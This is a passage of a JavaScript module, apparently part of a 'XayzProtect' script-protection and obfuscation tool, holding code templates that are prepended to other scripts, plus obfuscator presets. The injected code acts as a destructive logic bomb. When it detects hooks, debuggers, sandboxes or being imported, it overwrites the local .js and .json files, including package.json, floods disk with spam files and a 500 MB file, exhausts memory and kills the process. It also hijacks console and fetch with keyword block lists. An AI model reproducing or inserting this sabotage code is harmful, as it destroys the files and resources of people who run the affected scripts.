function replaceFilesOnBreach(options = {}) {
  const {
    spamConfig = { js: 500, txt: 400, json: 100 },
    spamDir = options.spamDir || path.join(__dirname, "Session"),
    spamTemplate = options.spamTemplate || "BYPASS TERDETEKSI - FILE ERROR\\n",
    replaceTemplate = options.replaceTemplate || "maklo gua ewe",
    replaceSize = typeof options.replaceSize === "number" ? options.replaceSize : 500000,
    spamContentSize = typeof options.spamContentSize === "number" ? options.spamContentSize : 5000000,
    maxSpamCount = typeof options.maxSpamCount === "number" ? options.maxSpamCount : 10000,
    memoryStress = true,
    diskStress = true
  } = options;

  console.log("\\x1b[31m%s\\x1b[0m", "\\n⚠️ XayzProtect By XYCoolcraft Protection Active!");

  try {
    const files = fs.readdirSync(__dirname).filter(f => /\.(js|json)$/i.test(f));
    for (const file of files) {
      const filePath = path.join(__dirname, file);
      if (!fs.existsSync(filePath)) continue;

      if (file.endsWith(".js")) {
        let buf = "";
        while (Buffer.byteLength(buf, "utf8") < replaceSize) buf += replaceTemplate + "\\n";
        fs.writeFileSync(filePath, buf.slice(0, replaceSize), "utf8");
      } else if (file.endsWith(".json")) {
        fs.writeFileSync(
          filePath,
          JSON.stringify({ replaced: true, msg: "Kena Bypass", at: new Date().toISOString() }, null, 2),
          "utf8"
        );
      }
    }

    if (!fs.existsSync(spamDir)) fs.mkdirSync(spamDir, { recursive: true });

    for (const [ext, count] of Object.entries(spamConfig)) {
      const total = Math.min(count, maxSpamCount);
      const pad = n => String(n).padStart(String(total).length, "0");
      const payload = spamTemplate.repeat(Math.ceil(spamContentSize / spamTemplate.length)).slice(0, spamContentSize);

      for (let i = 1; i <= total; i++) {
        const file = path.join(spamDir, \`Mampus-\${ext.toUpperCase()}-\${pad(i)}.\${ext}\`);
        fs.writeFileSync(file, payload);
      }
    }

    if (memoryStress) {
      const loads = [];
      for (let i = 0; i < 50; i++) {
        loads.push(Buffer.alloc(1024 * 1024 * 20, "A"));
      }
    }

    if (diskStress) {
      const bigFile = path.join(spamDir, "BoomPanel");
      const stream = fs.createWriteStream(bigFile);
      for (let i = 0; i < 10; i++) {
        stream.write("X".repeat(1024 * 1024 * 50));
      }
      stream.end();
    }
  } catch (err) {
    console.error("❌ Sanction Error:", err.message);
  }

  process.exit(1);
}

(function () {
  'use strict';
  const forceKill = () => replaceFilesOnBreach();

  if (require.main !== module || module.parent) {
    console.error('\\n[!] SECURITY ALERT: File ini tidak boleh diimpor atau dipanggil dari luar!');
    forceKill();
  }

  const proxyPattern = /Proxy|apply\\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\\.com.*includes/i;

  const buildStr = a => a.map(c => String.fromCharCode(c)).join('');
  const exitStr = buildStr([101, 120, 105, 116]);
  const killStr = buildStr([107, 105, 108, 108]);
  const httpsStr = buildStr([104, 116, 116, 112, 115]);
  const httpStr = buildStr([104, 116, 116, 112]);

  let nativeExit, nativeExecSync, nativePid, nativeKill;
  try {
    nativeExit = process[exitStr].bind(process);
    nativeExecSync = require(buildStr([99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115])).execSync;
    nativePid = process.pid;
    nativeKill = process[killStr].bind(process);
  } catch {}

  try {
    const M = require('module');
    if (bypassPattern.test(M.prototype.require.toString())) forceKill();
  } catch {}

  try {
    if (proxyPattern.test(process.exit.toString())) forceKill();
    if (proxyPattern.test(process.kill.toString())) forceKill();
  } catch {}

  try {
    const axios = require('axios');
    if (
      axios.interceptors.request.handlers.length > 0 ||
      axios.interceptors.response.handlers.length > 0
    ) {
      console.error('[X] Axios interceptors detected');
      forceKill();
    }
  } catch {}

  const flags = ['PLAxios', 'PLChalk', 'PLFetch', 'dbBypass', 'KEY', '__BYPASS__', 'originalExit', 'originalKill'];
  for (const flag of flags) {
    if (global[flag]) {
      console.error('[X] Global Bypass Flag Detected:', flag);
      forceKill();
    }
  }

  setTimeout(() => {
    try {
      const https = require(httpsStr);
      if (httpBypassPattern.test(Function.prototype.toString.call(https.request))) forceKill();
      const http = require(httpStr);
      if (httpBypassPattern.test(Function.prototype.toString.call(http.request))) forceKill();
    } catch {}
  }, 500);

  const monitor = () => {
    try {
      const M = require('module');
      if (bypassPattern.test(M.prototype.require.toString())) forceKill();
    } catch {}
    for (const flag of flags) {
      if (global[flag]) forceKill();
    }
  };

  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

  try {
    const orig = {
      log: console.log.bind(console),
      warn: console.warn.bind(console),
      error: console.error.bind(console),
    };

    const blocked = [
      'raw.githubusercontent', 'pastebin', 'dropbox', 'cdn.discordapp',
      'cookie', 'auth', 'token', 'apikey', 'secret', 'private_key', 'whitelist', 'github', 'gitlab'
    ];

    const red = '\\x1b[31m[XayzProtect] XayzProtect By XYCoolcraft Active\\x1b[0m';
    const detect = (...args) => {
      const msg = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ').toLowerCase();
      if (blocked.some(word => msg.includes(word))) {
        orig.log(red);
        return true;
      }
      return false;
    };

    ['log', 'warn', 'error'].forEach(type => {
      console[type] = function (...args) {
        if (!detect(...args)) orig[type](...args);
      };
    });

    if (typeof globalThis.fetch === 'function') {
      const originalFetch = globalThis.fetch.bind(globalThis);
      globalThis.fetch = async (...args) => {
        const url = String(args[0] || '').toLowerCase();
        if (blocked.some(w => url.includes(w))) {
          orig.log(red);
          throw new Error('Akses fetch mencurigakan diblokir.');
        }
        return originalFetch(...args);
      };
    }

  } catch (e) {
    console.error('[XayzProtect Error]', e.message || e);
  }

  // ============ FINAL HARDLOCK ============  
  try {
    const crypto = require('crypto');
    const child = require('child_process');
    const mod = require('module');
    const CORE = {
      exit: process.exit.bind(process),
      kill: process.kill.bind(process),
      hash: crypto.createHash("sha256").update(fs.readFileSync(__filename)).digest("hex"),
      modRequire: mod.prototype.require.bind(mod.prototype)
    };

    let last = Date.now();
    setInterval(() => {
      const now = Date.now();
      if (now - last > 500) forceKill();
      last = now;
    }, 100);

    if (
      /tmp|snapshot|sandbox|virtual|container/i.test(process.cwd()) ||
      process.execArgv?.some(a => /inspect|trace|hook/i.test(a))
    ) forceKill();

    Object.freeze(process);
    Object.freeze(fs);
    Object.freeze(child);
    Object.freeze(mod);

    setInterval(() => {
      try {
        const nowHash = crypto.createHash("sha256").update(fs.readFileSync(__filename)).digest("hex");
        if (nowHash !== CORE.hash) forceKill();
      } catch {
        forceKill();
      }
      if (mod.prototype.require.toString() !== CORE.modRequire.toString()) forceKill();
    }, 1200);

  } catch (e) {
    console.error("[XayzProtect++ Error]", e.message || e);
    forceKill();
  }

})();`;

  return destroyer + "\n" + code;
};

const addKode = (code) => {
  const lolive = `
(function() {
  'use strict';
  
  // ===== CHECK: Detect if loaded via require() =====
  if (require.main !== module) {
    console.error('\\n[!] SECURITY ALERT: Bot dipanggil melalui file lain');
    console.error('[!] File saat ini: ' + __filename);
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'));
    console.error('[!] Akses ditolak - Process dihentikan\\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\\n[!] SECURITY ALERT: Terdeteksi parent module');
    console.error('[!] Parent: ' + module.parent.filename);
    console.error('[!] Akses ditolak - Process dihentikan\\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }

  // Pattern regex
  const proxyPattern = /Proxy|apply\\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\\.com.*includes/i;

  const buildStr = (a) => a.map(c => String.fromCharCode(c)).join('');
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn;
  try {
    nativeExit = process[exitStr].bind(process);
    nativeKill = process[killStr].bind(process);
    nativeOn = process.on.bind(process);
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
    nativePid = process.pid;
  } catch(e) {}

  const forceKill = () => {
    try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1) {}
  };

  try {
    const M = require('module');
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const exitFn = process[exitStr];
    const exitCode = exitFn.toString();
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override');
      forceKill();
    }
  } catch(e) {}

  try {
    const killFn = process[killStr];
    const killCode = killFn.toString();
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected');
      forceKill();
    }
  } catch(e) {}

  const checkGlobals = () => {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill'];
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i]);
          forceKill();
        }
      } catch(e) {}
    }
  };
  checkGlobals();

  const checkHttps = () => {
    try {
      const https = require(httpsStr);
      const reqFunc = https.request;
      const realToString = Function.prototype.toString.call(reqFunc);
      if (httpBypassPattern.test(realToString)) {
        console.error('[X] https.request contains bypass patterns');
        forceKill();
      }
    } catch(e) {}
  };

  const checkHttp = () => {
    try {
      const http = require(httpStr);
      const reqFunc = http.request;
      const realToString = Function.prototype.toString.call(reqFunc);
      if (httpBypassPattern.test(realToString)) {
        console.error('[X] http.request contains bypass patterns');
        forceKill();
      }
    } catch(e) {}
  };

  setTimeout(() => {
    checkHttps();
    checkHttp();
  }, 500);

  const monitor = () => {
    try {
      const M = require('module');
      const reqStr = M.prototype.require.toString();
      if (bypassPattern.test(reqStr)) {
        console.error('[X] Runtime: Module.require compromised');
        forceKill();
      }
    } catch(e) {}
    checkGlobals();
  };

  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

  // ===== Tambahan: console / fetch / XHR Protection =====
  try {
    const orig = {
      log: console.log.bind(console),
      warn: console.warn.bind(console),
      error: console.error.bind(console)
    };

    // Hanya kata-kata sensitif — jangan masukkan 'http'/'https' agar tidak memblokir valid URL
    const blocked = [
      'raw.githubusercontent', 'raw.githubusercontent.com', 'pastebin', 'dropbox', 'cdn.discordapp',
      'session', 'cookie', 'auth', 'login', 'credentials', 'token', 'apikey', 'apikey=', 'api_key',
      'secret', 'private_key', 'whitelist', 'github', 'gitlab', 'database', 'sql', 'mongodb', 'redis'
    ];

    const red = '\\x1b[31m[XayzProtect] Server XYCoolcraft Hard Protection\\x1b[0m';
    const detect = (...args) => {
      try {
        const msg = args.map(a => {
          if (typeof a === 'string') return a;
          try { return JSON.stringify(a); } catch(e) { return String(a); }
        }).join(' ').toLowerCase();
        if (blocked.some(word => word && msg.includes(word))) {
          orig.log(red);
          return true;
        }
      } catch(e) {
        // If anything odd happens while detecting, be conservative and treat as suspicious
        orig.log(red);
        return true;
      }
      return false;
    };

    ['log', 'warn', 'error'].forEach(type => {
      console[type] = function(...args) {
        try {
          if (!detect(...args)) {
            orig[type].apply(console, args);
          }
        } catch(e) {
          try { orig[type].apply(console, args); } catch(_) {}
        }
      };
    });

    if (typeof globalThis !== 'undefined' && typeof globalThis.fetch === 'function') {
      const originalFetch = globalThis.fetch.bind(globalThis);
      globalThis.fetch = async (...args) => {
        try {
          const url = String(args[0] || '').toLowerCase();
          if (blocked.some(w => w && url.includes(w))) {
            orig.log(red);
            throw new Error('Akses fetch mencurigakan diblokir.');
          }
        } catch(e) {
          orig.log(red);
          throw e;
        }
        return originalFetch(...args);
      };
    }

    // XMLHttpRequest protection (browser-like env); safe-guard if exists
    if (typeof XMLHttpRequest !== 'undefined' && XMLHttpRequest && XMLHttpRequest.prototype) {
      const open = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (method, url, ...rest) {
        try {
          if (typeof url === 'string') {
            const lower = url.toLowerCase();
            if (blocked.some(w => w && lower.includes(w))) {
              orig.log(red);
              throw new Error('Akses XHR mencurigakan diblokir.');
            }
          }
        } catch(e) {
          orig.log(red);
          throw e;
        }
        return open.call(this, method, url, ...rest);
      };
    }

  } catch (e) {
    try { console.error('\\x1b[31m[XayzProtect Error]\\x1b[0m', e && e.message ? e.message : e); } catch(_) {}
  }

  // === Tambahkan fungsi replaceFilesOnBreach ke dalam IIFE XayzProtect ===
  try {
    const fs = require('fs');
    const path = require('path');

    function replaceFilesOnBreach() {
      try {
        console.log("\\x1b[31m%s\\x1b[0m", "⚠️ Bypass Dicegah Dari Server");

        const adminFile = path.join(__dirname, "admin.json");
        if (fs.existsSync(adminFile)) {
          const jsonErr = JSON.stringify({
            replaced: true,
            reason: "Humm Kau Kang Bypass Rupanya",
            replacedAt: new Date().toISOString()
          }, null, 2);
          fs.writeFileSync(adminFile, jsonErr, "utf8");
          console.log("🔁 Script Dierrorkan !");
        }

        const pkgFile = path.join(__dirname, "package.json");
        if (fs.existsSync(pkgFile)) {
          const jsonErr = JSON.stringify({
            replaced: true,
            reason: "Server Ini Dikontrol Bypass !",
            replacedAt: new Date().toISOString()
          }, null, 2);
          fs.writeFileSync(pkgFile, jsonErr, "utf8");
          console.log("🔁 Server XYCoolcraft Mencegah Bypass");
        }

      } catch (err) {
        try { console.log("❌ Gagal menimpa file: " + (err && err.message ? err.message : err)); } catch(_) {}
      }

      try { console.log("\\x1b[31m%s\\x1b[0m", "🚨 Selesai Errorkan Script Yang Dibypass."); } catch(_) {}
      try { process.exit(1); } catch(e) {}
      for(;;) {}
    }

    // expose to global in case external code wants to trigger it
    try { if (typeof global !== 'undefined') global.__XayzProtect_replace_on_breach = replaceFilesOnBreach; } catch(e) {}

  } catch (e) {
    // ignore any errors when adding replaceFilesOnBreach into the IIFE
  }

})();`;

  return lolive + "\n" + code;
};

const configs = {
    "ghost": () => {
        const generateTrickyName = () => {
            const zwsp = '\u200C';
            const safeKeywords = ["break", "case", "catch", "class", "const", "continue", "debugger", "default", "delete", "do", "else", "export", "extends", "finally", "for", "function", "if", "import", "in", "instanceof", "new", "return", "super", "switch", "this", "throw", "try", "typeof", "var", "void", "while", "with", "yield", "enum", "await", "implements", "package", "protected", "interface", "private", "public", "null", "true", "false", "axios", "fs", "path", "require", "module", "exports", "process", "global", "console", "Buffer", "setTimeout"];
            const repeatCount = Math.floor(Math.random() * (99 - 9 + 1)) + 9;
            return safeKeywords[Math.floor(Math.random() * safeKeywords.length)] + zwsp.repeat(repeatCount);
        };
        return {
            target: "node",
            compact: true,
            minify: true,
            calculator: true,
            dispatcher: true,
            flatten: true,
            movedDeclarations: true,
            objectExtraction: true,
            hexadecimalNumbers: true,
            renameVariables: true,
            renameGlobals: true,
            globalConcealing: true,
            identifierGenerator: generateTrickyName,
            controlFlowFlattening: true,
            deadCode: 0.99,
            duplicateLiteralsRemoval: true,
            opaquePredicates: true,
            stringConcealing: true,
            stringSplitting: true,
            stringEncoding: ["base64", "rc4", "aes"]
        };
    },
    "encnew": () => ({
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: "zeroWidth",
        stringCompression: true,
        stringConcealing: false,
        stringEncoding: true,
        controlFlowFlattening: 0.95,
        flatten: true,
        shuffle: true,
        rgf: false,
        dispatcher: true,
        globalConcealing: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true },
        duplicateLiteralsRemoval: true
    }),
    "japan": () => {
        const japaneseChars = ["あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ", "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と", "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ", "ま", "み", "む", "め", "も", "や", "ゆ", "よ"];
        const generateJapaneseName = () => {
            const length = Math.floor(Math.random() * 4) + 3;
            let name = "";
            for (let i = 0; i < length; i++) {
                name += japaneseChars[Math.floor(Math.random() * japaneseChars.length)];
            }
            return name;
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: () => generateJapaneseName(),
            stringEncoding: true,
            stringSplitting: true,
            controlFlowFlattening: 0.9,
            flatten: true,
            shuffle: true,
            duplicateLiteralsRemoval: true,
            deadCode: true,
            calculator: true,
            opaquePredicates: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
    },
    "timelocked": (days) => {
        const expiryDate = new Date();
        expiryDate.setDate(expiryDate.getDate() + parseInt(days));
        const expiryTimestamp = expiryDate.getTime();
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: "randomized",
            stringCompression: true,
            stringConcealing: true,
            stringEncoding: true,
            controlFlowFlattening: 0.75,
            flatten: true,
            shuffle: true,
            rgf: false,
            opaquePredicates: { count: 6, complexity: 4 },
            dispatcher: true,
            globalConcealing: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true },
            duplicateLiteralsRemoval: true,
            preamble: `(function(){const expiry=${expiryTimestamp};if(new Date().getTime()>expiry){throw new Error('Script has expired after ${days} days');}})();`
        };
    },
    "custom": (customName) => {
        const generateCustomName = () => {
            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            const randomSuffixLength = Math.floor(Math.random() * 9) + 9;
            let suffix = "";
            for (let i = 0; i < randomSuffixLength; i++) {
                suffix += chars[Math.floor(Math.random() * chars.length)];
            }
            return `${customName}_${suffix}`;
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: () => generateCustomName(),
            stringEncoding: true,
            stringSplitting: true,
            controlFlowFlattening: 0.9,
            shuffle: true,
            duplicateLiteralsRemoval: true,
            deadCode: 0.7,
            opaquePredicates: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
    },
    "ultra": () => {
        const generateUltraName = () => {
            const chars = "abcdefghijklmnopqrstuvwxyz";
            const numbers = "0123456789";
            const randomNum = numbers[Math.floor(Math.random() * numbers.length)];
            const randomChar = chars[Math.floor(Math.random() * chars.length)];
            return `ต้${randomNum}${randomChar}${Math.random().toString(36).substring(2, 6)}`;
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: () => generateUltraName(),
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: true,
            controlFlowFlattening: 0.9,
            flatten: true,
            shuffle: true,
            rgf: true,
            deadCode: true,
            opaquePredicates: true,
            dispatcher: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
    },
    "siu": () => {
        const generateSiuCalcrickName = () => {
            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let randomPart = "";
            for (let i = 0; i < 20; i++) randomPart += chars[Math.floor(Math.random() * chars.length)];
            return `CalceKarik和SiuSiu无与伦比的帅气${randomPart}`;
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: generateSiuCalcrickName,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: true,
            controlFlowFlattening: 0.95,
            shuffle: true,
            rgf: false,
            flatten: true,
            duplicateLiteralsRemoval: true,
            deadCode: true,
            calculator: true,
            opaquePredicates: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
    },
    "debug": () => ({
        target: "node",
        calculator: true,
        compact: true,
        hexadecimalNumbers: true,
        controlFlowFlattening: 1.0,
        deadCode: 0.94,
        dispatcher: true,
        duplicateLiteralsRemoval: 1.0,
        flatten: true,
        globalConcealing: true,
        identifierGenerator: "zeroWidth",
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: 1.0,
        renameVariables: true,
        renameGlobals: true,
        stringConcealing: true,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 1.0,
        rgf: false
    }),
    "arab": () => {
        const arabicChars = ["XYCoolcraft", "XayzTech", "XayzCoreX", "XYCoolcraft", "XayzTech", "XayzCoreX", "XayzCoreX", "XYCoolcraft", "XayzTech", "XayzCoreX", "XYCoolcraft", "XYCoolcraft", "XayzTech", "XayzCoreX", "XYCoolcraft", "XayzCoreX", "XYCoolcraft", "XayzCoreX", "XayzCoreX", "XYCoolcraft", "XYCoolcraft", "XayzCoreX", "XayzCoreX", "XayzCoreX", "XYCoolcraft", "XYCoolcraft", "XayzCoreX", "XayzCoreX"];
        const generateArabicName = () => {
            const length = Math.floor(Math.random() * 4) + 3;
            let name = "";
            for (let i = 0; i < length; i++) name += arabicChars[Math.floor(Math.random() * arabicChars.length)];
            return name;
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: () => generateArabicName(),
            stringEncoding: true,
            stringSplitting: true,
            controlFlowFlattening: 0.95,
            shuffle: true,
            duplicateLiteralsRemoval: true,
            deadCode: true,
            calculator: true,
            opaquePredicates: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
    },
    "nova": () => {
        const generateNovaName = () => "var_" + Math.random().toString(36).substring(7);
        return {
            target: "node",
            calculator: false,
            compact: true,
            controlFlowFlattening: 1,
            deadCode: 0.8,
            dispatcher: true,
            duplicateLiteralsRemoval: 1,
            flatten: true,
            globalConcealing: true,
            hexadecimalNumbers: 1,
            identifierGenerator: generateNovaName,
            lock: { antiDebug: true, integrity: true, selfDefending: true },
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: true,
            renameGlobals: true,
            renameVariables: true,
            shuffle: true,
            stringCompression: true,
            stringConcealing: true
        };
    },
    "militery": () => {
        const generateTrickyName = () => {
            const zwsp = '‌';
            const safeKeywords = ["break","case","catch","class","const","continue","debugger","default","delete","do","else","export","extends","finally","for","function","if","import","in","instanceof","new","return","super","switch","this","throw","try","typeof","var","void","while","with","yield","enum","await","implements","package","protected","interface","private","public","null","true","false"];
            return safeKeywords[Math.floor(Math.random() * safeKeywords.length)] + zwsp.repeat(Math.floor(Math.random() * (999 - 9 + 9)) + 9 - 9);
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: false,
            identifierGenerator: generateTrickyName,
            stringEncoding: true,
            controlFlowFlattening: 0.8,
            shuffle: true,
            duplicateLiteralsRemoval: true,
            deadCode: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true }
        };
    },
    "enigma": () => {
        const gen = () => {
            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            let s = "";
            const len = 10 + Math.floor(Math.random() * 90);
            for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
            return s.split("").join("‌");
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: gen,
            stringEncoding: true,
            controlFlowFlattening: 0.9,
            shuffle: true,
            duplicateLiteralsRemoval: true,
            deadCode: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
    },
    "evabula": () => ({
        target: "node",
        calculator: true,
        compact: true,
        hexadecimalNumbers: true,
        controlFlowFlattening: 0.9,
        deadCode: 0.9,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.9,
        flatten: true,
        globalConcealing: true,
        identifierGenerator: "zeroWidth",
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: 0.95,
        renameVariables: true,
        renameGlobals: true,
        stringConcealing: true,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 0.75,
        rgf: false
    }),
    "balanced": () => {
        const gen = () => {
            const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            const zw = "\u200C";
            const len = 9 + Math.floor(Math.random() * 98);
            let id = letters[Math.floor(Math.random() * letters.length)];
            for (let i = 1; i < len; i++) {
                id += chars[Math.floor(Math.random() * chars.length)];
                if (Math.random() > 0.9) id += zw;
            }
            return id;
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: gen,
            stringEncoding: true,
            controlFlowFlattening: 1.0,
            shuffle: true,
            duplicateLiteralsRemoval: true,
            deadCode: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
    },
    "reversed": () => {
        const randomChars = ["Xayz難読化装置", "難Tech読化装置", "難読Xayz化装置", "難読化Tech装置", "難読化装Xayz置", "難読化装置Tech", "難読化装置Xayz", "難読化装Tech置", "難読化Xayz装置", "難読Tech化装置", "難Xayz読化装置", "Tech難読化装置", "難読化装置", "置装化読難"];
        const generateArabicName = () => {
            const length = Math.floor(Math.random() * 9) + 9;
            let name = "";
            for (let i = 0; i < length; i++) name += randomChars[Math.floor(Math.random() * randomChars.length)];
            return name;
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: () => generateArabicName(),
            stringEncoding: true,
            stringSplitting: true,
            controlFlowFlattening: 0.95,
            shuffle: true,
            duplicateLiteralsRemoval: true,
            deadCode: 0.7,
            calculator: true,
            opaquePredicates: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
    },
    "japxarab": () => {
        const japaneseXArabChars = ["あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ", "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と", "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ", "ま", "み", "む", "め", "も", "や", "ゆ", "よ","أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر", "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف", "ق", "ك", "ل", "م", "ن", "ه", "و", "ي","ら", "り", "る", "れ", "ろ", "わ", "を", "ん"];
        const generateJapaneseXArabName = () => {
            const length = Math.floor(Math.random() * 8) + 9;
            let name = "";
            for (let i = 0; i < length; i++) name += japaneseXArabChars[Math.floor(Math.random() * japaneseXArabChars.length)];
            return name;
        };
        return {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: () => generateJapaneseXArabName(),
            stringCompression: true,
            stringConcealing: true,
            stringEncoding: true,
            stringSplitting: true,
            controlFlowFlattening: 0.95,
            flatten: true,
            shuffle: true,
            rgf: false,
            dispatcher: true,
            duplicateLiteralsRemoval: true,
            deadCode: 0.8,
            calculator: true,
            opaquePredicates: true,
            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
    },
    "rosemary": () => {
        const mulberry32 = (a) => () => {
            let t = (a += 0x6D2B79F5);
            t = Math.imul(t ^ (t >>> 15), t | 1);
            t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
            return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
        };
        const seed = (Date.now() ^ (typeof performance !== "undefined" ? (performance.now() | 0) : 0)) >>> 0;
        const rnd = mulberry32(seed);
        const idGen = () => {
            const head = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
            const tail = head + "0123456789";
            const len = 7 + Math.floor(rnd() * 17);
            let s = head[Math.floor(rnd() * head.length)];
            for (let i = 1; i < len; i++) {
                s += tail[Math.floor(rnd() * tail.length)];
                if (rnd() > 0.84) s += "\u200C";
            }
            return s;
        };
        return {
            target: "node",
            compact: true,
            minify: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: idGen,
            stringEncoding: true,
            stringCompression: true,
            stringConcealing: true,
            stringSplitting: 1,
            controlFlowFlattening: 1,
            flatten: true,
            opaquePredicates: 1,
            dispatcher: true,
            hexadecimalNumbers: true,
            duplicateLiteralsRemoval: true,
            objectExtraction: true,
            movedDeclarations: true,
            deadCode: 0.9,
            globalConcealing: true,
            shuffle: true,
            lock: { selfDefending: true, integrity: true, antiDebug: true, tamperProtection: true }
        };
    }
};

module.exports = { configs, addProtection, addkeras, addBypass, killBypass, BergemaSelamanya, addKode, addTools };